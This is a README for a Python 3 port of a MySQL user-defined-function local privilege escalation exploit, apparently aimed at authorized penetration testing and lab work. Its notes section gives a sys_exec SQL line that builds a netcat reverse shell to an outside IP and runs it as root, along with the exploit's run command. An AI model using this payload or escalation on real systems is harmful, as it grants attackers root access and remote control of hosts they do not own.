# udf_root_py3

**Advisory**
All the binaries/scripts/code of udf_root_py3 should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
* * *
**I cannot accept the credit for this really useful script. I have simply made a few changes to a script I found so that it is Python3 compatible.**
* * *

**Original:** [https://github.com/d7x/udf_root](https://github.com/d7x/udf_root)
Thank you d7x for this awesome script.
* * *

MySQL User-Defined function Dynamic Library Local Privilege Escalation

*** MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit ***

UDF lib shellcodes retrieved from metasploit (there are windows .dll libraries within metasploit as well so this could be easily ported to Windows)

Based on the famous raptor_udf.c by Marco Ivaldi (EDB ID: 1518)
CVE: N/A

References:

[https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html](https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html)

[https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

[https://www.exploit-db.com/papers/44139/](https://www.exploit-db.com/papers/44139/) - MySQL UDF Exploitation by Osanda Malith Jayathissa (@OsandaMalith)


* * *

**Notes**

One thing I noticed when I used this script - the root shell that it attempts to give you after completing was NOT a root shell. However if you exit out of the shell it puts you into and just execute code like:
```
select sys_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 80 >/tmp/f');
```
Then this will execute as root.

To run the tool - use like:
```
python3 udf_root_py3.py --username root --password rootPassword
```
